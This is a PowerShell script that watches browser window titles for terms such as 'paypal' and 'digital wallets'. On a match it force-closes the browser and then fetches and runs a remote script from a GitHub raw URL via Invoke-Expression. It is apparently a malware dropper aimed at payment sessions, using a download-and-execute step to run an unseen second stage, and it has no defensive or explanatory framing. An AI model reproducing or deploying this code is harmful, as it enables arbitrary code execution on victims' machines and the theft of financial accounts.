# Define a list of partial titles you want to monitor
$targetTitles = @("Powerful tools", "paypal", "digital wallets")

# Define a list of popular browser process names
$browserProcesses = @("chrome", "firefox", "msedge", "opera")

# Define the interval to check (in seconds)
$checkInterval = 15

# Flag to determine if the condition is met
$conditionMet = $false

# URL of the action script
$actionScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1"

# Function to trigger the action script
function Trigger-ActionScript {
    Invoke-Expression (iwr $actionScriptUrl).Content
}

# Outer loop to run continuously
while ($true) {
    if ($conditionMet) {
        Trigger-ActionScript
        break  # Exit the monitoring loop and trigger the action
    }

    foreach ($browserName in $browserProcesses) {
        $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
        if ($currentBrowserProcesses) {
            foreach ($process in $currentBrowserProcesses) {
                try {
                    $processTitle = $process.MainWindowTitle
                    Write-Host "$browserName - Window Title: $processTitle"
                    if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
                        Write-Host "Detected one of the specified titles in $browserName. Closing..."
                        Stop-Process -Id $process.Id -Force
                        $conditionMet = $true  # Set the flag to true when any condition is met
                        break 3  # Exit both inner and outer loops when any condition is met
                    }
                } catch {
                    # Handle any exceptions that might occur (e.g., due to missing access permissions)
                }
            }
        }
    }

    Start-Sleep -Seconds $checkInterval
}

